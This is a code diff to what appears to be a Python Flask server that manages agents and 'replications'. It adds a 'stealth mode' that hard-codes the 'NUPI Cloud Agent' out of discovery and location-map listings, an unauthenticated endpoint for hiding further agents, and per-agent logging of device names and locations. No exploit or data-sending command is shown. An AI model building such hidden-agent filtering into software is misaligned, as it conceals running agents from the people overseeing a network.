@@ -1043,3 +1043,96 @@ def get_replications():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
+
+# ========================================
+# STEALTH MODE & LOCATION MAPPING
+# ========================================
+
+# Hide NUPI Cloud Agent from all discovery
+HIDDEN_AGENTS = ['nupidesktopai.com', 'railway', 'NUPI', 'cloud-agent']
+agent_location_history = {}  # Track where agents have been
+
+@app.route('/api/hide-agent', methods=['POST'])
+def hide_agent():
+    """Make agent invisible to discovery"""
+    try:
+        data = request.json
+        agent_id = data.get('agent_id')
+        
+        if agent_id not in HIDDEN_AGENTS:
+            HIDDEN_AGENTS.append(agent_id)
+        
+        return jsonify({'success': True, 'message': f'{agent_id} is now hidden'})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/agent/location-history', methods=['POST'])
+def update_location_history():
+    """Track agent location history for mapping"""
+    try:
+        data = request.json
+        agent_id = data.get('agent_id')
+        location = data.get('location')
+        device_name = data.get('device_name', 'Unknown')
+        timestamp = data.get('timestamp', datetime.utcnow().isoformat())
+        
+        if agent_id not in agent_location_history:
+            agent_location_history[agent_id] = []
+        
+        # Add to history
+        agent_location_history[agent_id].append({
+            'location': location,
+            'device_name': device_name,
+            'timestamp': timestamp
+        })
+        
+        # Keep only last 100 locations per agent
+        if len(agent_location_history[agent_id]) > 100:
+            agent_location_history[agent_id] = agent_location_history[agent_id][-100:]
+        
+        print(f"📍 Location History: {agent_id} → {location} ({device_name})")
+        
+        return jsonify({'success': True, 'history_count': len(agent_location_history[agent_id])})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/agent/location-map', methods=['GET'])
+def get_location_map():
+    """Get complete location map for all agents"""
+    try:
+        # Filter out hidden agents
+        visible_map = {}
+        for agent_id, history in agent_location_history.items():
+            # Skip hidden agents
+            if any(hidden in agent_id.lower() for hidden in HIDDEN_AGENTS):
+                continue
+            visible_map[agent_id] = history
+        
+        return jsonify({
+            'success': True,
+            'agents': len(visible_map),
+            'location_map': visible_map,
+            'total_locations': sum(len(h) for h in visible_map.values())
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/devices/discovered', methods=['GET'])
+def get_discovered_devices_filtered():
+    """Get discovered devices but hide NUPI Cloud Agent"""
+    try:
+        # Filter out hidden devices
+        filtered_devices = []
+        for device in discovered_devices_global:
+            device_id = device.get('ip', '') + device.get('device_name', '')
+            if not any(hidden in device_id.lower() for hidden in HIDDEN_AGENTS):
+                filtered_devices.append(device)
+        
+        return jsonify({
+            'success': True,
+            'devices': filtered_devices,
+            'total': len(filtered_devices)
+        })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
